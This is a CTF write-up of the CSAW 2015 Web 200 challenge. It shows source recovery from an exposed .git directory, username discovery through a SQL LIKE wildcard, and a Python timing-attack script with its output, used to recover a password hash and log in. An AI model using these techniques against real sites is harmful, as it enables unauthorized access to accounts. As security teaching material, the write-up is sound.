---
layout: post
title: "CSAW CTF 2015 - Web 200 Writeup"
date: 2015-09-21 17:01
comments: true
categories: 
- csaw2015
- ctf
- writeup
---
<img src="{{root_url}}/images/headers/csaw_200.png"/>

Web 200 was a fun challenge that required us to chain together a few basic concepts to get the flag. When navigating to the URL given, we see that the challenge is based on a "Lawn Care Simulator 2015".
<!--more-->
<img src="{{root_url}}/images/blog/csaw2015/lawn_care.png">

We can immediately see there's a sign in form, which might prove useful later. But before we get too far into that, let's view the page source. Opening up the source, we see the following javascript snippet:

``` javascript
function init(){
            document.getElementById('login_form').onsubmit = function() {
                var pass_field = document.getElementById('password'); 
                pass_field.value = CryptoJS.MD5(pass_field.value).toString(CryptoJS.enc.Hex);
        };
        $.ajax('.git/refs/heads/master').done(function(version){$('#version').html('Version: ' +  version.substring (0,6))});
        initGrass();
}
```
You'll notice that there's an ajax call being made to a ```.git``` directory. If this is a full Git repo, we should be able to clone it:

``` bash
jordan@temp:~$ git clone http://54.175.3.248:8089/.git web200
jordan@temp:~$ ls web200
___HINT___  jobs.html  premium.php  validate_pass.php
index.html  js         sign_up.php
```
*Nice!* Now we can dive into the PHP. The ```__HINT__``` didn't prove to useful to me, but maybe I just didn't *get* it. Let's get started by looking at the relevant parts of ```premium.php```.

``` php
<?php
    require_once 'validate_pass.php';
    require_once 'flag.php';
    if (isset($_POST['password']) && isset($_POST['username'])) {
        $auth = validate($_POST['username'], $_POST['password']);
        if ($auth){
            echo "<h1>" . $flag . "</h1>";
        }
        else {
            echo "<h1>Not Authorized</h1>";
        }
    }
    else {
        echo "<h1>You must supply a username and password</h1>";
    }
?>
```
It looks like our flag is found in ```flag.php```. Unfortunately, we don't have that file, but it looks like ```$flag``` is printed if we authenticate correctly.

The authentication is handled by the ```validate(username, password)``` function in ```validate_pass.php```. Let's see what it looks like:

``` php
<?php
    <snip>
    $user = mysql_real_escape_string($user);
    $query = "SELECT hash FROM users WHERE username='$user';";
    $result = mysql_query($query) or die('Query failed: ' . mysql_error());
    $line = mysql_fetch_row($result, MYSQL_ASSOC);
    $hash = $line['hash'];

    if (strlen($pass) != strlen($hash))
        return False;

    $index = 0;
    while($hash[$index]){
        if ($pass[$index] != $hash[$index])
            return false;
        # Protect against brute force attacks
        usleep(300000);
        $index+=1;
    }
    return true;
    <snip>
?>
```
This function gets the password hash from the given username and then compares it character by character with the hash provided. Keep in mind, our password was hashed in Javascript in the snippet shown above.

We'll get back to the password comparison later. First, how do we get the username? We have one more file, ```sign_up.php``` that might help. Let's take a look:

``` php
<?php
    <snip>
    $user = mysql_real_escape_string($_POST['username']);
    // check to see if the username is available
    $query = "SELECT username FROM users WHERE username LIKE '$user';";
    $result = mysql_query($query) or die('Query failed: ' . mysql_error());
    $line = mysql_fetch_row($result, MYSQL_ASSOC);
    if ($line == NULL){
        // Signing up for premium is still in development
        echo '<h2 style="margin: 60px;">Lawn Care Simulator 2015 is currently in a private beta. Please check back later</h2>';
    }
    else {
        echo '<h2 style="margin: 60px;">Username: ' . $line['username'] . " is not available</h2>";
    }
    <snip>
?>
```
This function tries to look up the username given and, if it exists, will tell us the username isn't available. We could try guessing (I did), but that doesn't help. Let's look more closely at the code.

The SQL statement is done via a ```LIKE``` condition. This allows us to use the ```%``` character as a wildcard. So, by trying the username ```%```, we should get the username from the database.

<img src="{{root_url}}/images/blog/csaw2015/username.png">

Awesome - our username is ```~~FLAG~~```. Now we need to find the password.

Going back to the code given in ```validate_pass.php```, we see the following comparison

``` php
    while($hash[$index]){
        if ($pass[$index] != $hash[$index])
            return false;
        # Protect against brute force attacks
        usleep(300000);
        $index+=1;
    }
```
This snippet checks our hash against the one pulled from the databse. It does this by checking each character. If the character is wrong, it returns false immediately. However, look at what happens if the character is right. It does a ```usleep(300000)```, which is .3 seconds. This means that, if we check every character, one will take longer. This is a **timing attack**.

I wrote a quick script to exploit this. Here is the final (not very good) code I wound up using:

``` text
import time
import requests

data = {
	"username" : "~~FLAG~~",
	"password" : ""
}

url = "http://54.175.3.248:8089/premium.php"

password = ['a']*32 

def send_request(password):
	data["password"] = password
	start = time.time()
	requests.post(url, data=data)
	end = time.time()
	return end - start	

hex = "0123456789abcdef"

for i in range(32):
	max_time = 0
	char = ""
	index = 0
	for j in hex:
		temp_pass = password
		temp_pass[i] = j
		request_time = send_request("".join(temp_pass))
		if request_time >= max_time:
			index = i
			max_time = request_time
			char = j
	password[index] = char	
	print "".join(password)
```
This basically brute forces the password by checking each valid hex character to see which takes the longest amount of time. It does this for each character in the hash. Running the code produces the following output:

``` text
6aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
66aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
667aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
667eaaaaaaaaaaaaaaaaaaaaaaaaaaaa
667e2aaaaaaaaaaaaaaaaaaaaaaaaaaa
667e21aaaaaaaaaaaaaaaaaaaaaaaaaa
667e217aaaaaaaaaaaaaaaaaaaaaaaaa
667e2176aaaaaaaaaaaaaaaaaaaaaaaa
667e21766aaaaaaaaaaaaaaaaaaaaaaa
667e217666aaaaaaaaaaaaaaaaaaaaaa
667e217666aaaaaaaaaaaaaaaaaaaaaa
667e217666a1aaaaaaaaaaaaaaaaaaaa
667e217666a13aaaaaaaaaaaaaaaaaaa
667e217666a13daaaaaaaaaaaaaaaaaa
667e217666a13d3aaaaaaaaaaaaaaaaa
667e217666a13d39aaaaaaaaaaaaaaaa
667e217666a13d39aaaaaaaaaaaaaaaa
667e217666a13d39a0aaaaaaaaaaaaaa
667e217666a13d39a02aaaaaaaaaaaaa
667e217666a13d39a023aaaaaaaaaaaa
667e217666a13d39a0239aaaaaaaaaaa
667e217666a13d39a02399aaaaaaaaaa
667e217666a13d39a023995aaaaaaaaa
667e217666a13d39a0239951aaaaaaaa
667e217666a13d39a0239951eaaaaaaa
667e217666a13d39a0239951efaaaaaa
667e217666a13d39a0239951efeaaaaa
667e217666a13d39a0239951efe2aaaa
667e217666a13d39a0239951efe2daaa
667e217666a13d39a0239951efe2deaa
667e217666a13d39a0239951efe2de4a
667e217666a13d39a0239951efe2de48
```
Now, all that's left is to login and get the flag. To bypass the javascript hashing, I just used the dev console (you could also do this in Python!):

``` text
$.post('premium.php', {"username": "~~FLAG~~", "password" : "667e217666a13d39a0239951efe2de48"}).success(function(data){console.log(data)})
<head>
    <title>Lawn Care Simulator 2015</title>
    <script src="//code.jquery.com/jquery-1.11.3.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> 
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
</head>
<body>
<h1>flag{gr0wth__h4ck!nG!1!1!</h1></body>
</html>
```
And there we have the flag: ```flag{gr0wth__h4ck!nG!1!1!}```

-Jordan ([@jw_sec](https://twitter.com/jw_sec))
